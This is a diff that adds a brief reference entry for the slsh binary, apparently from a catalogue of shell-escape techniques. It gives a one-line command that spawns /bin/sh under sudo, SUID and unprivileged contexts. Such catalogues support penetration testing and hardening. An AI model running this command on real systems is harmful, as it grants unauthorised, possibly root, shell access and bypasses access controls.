@@ -1,0 +1,14 @@
+slsh
+====
+
+Shell
+-----
+
+[Sudo]
+    slsh -e 'system("/bin/sh")'
+
+[SUID]
+    slsh -e 'system("/bin/sh")'
+
+[Unprivileged]
+    slsh -e 'system("/bin/sh")'
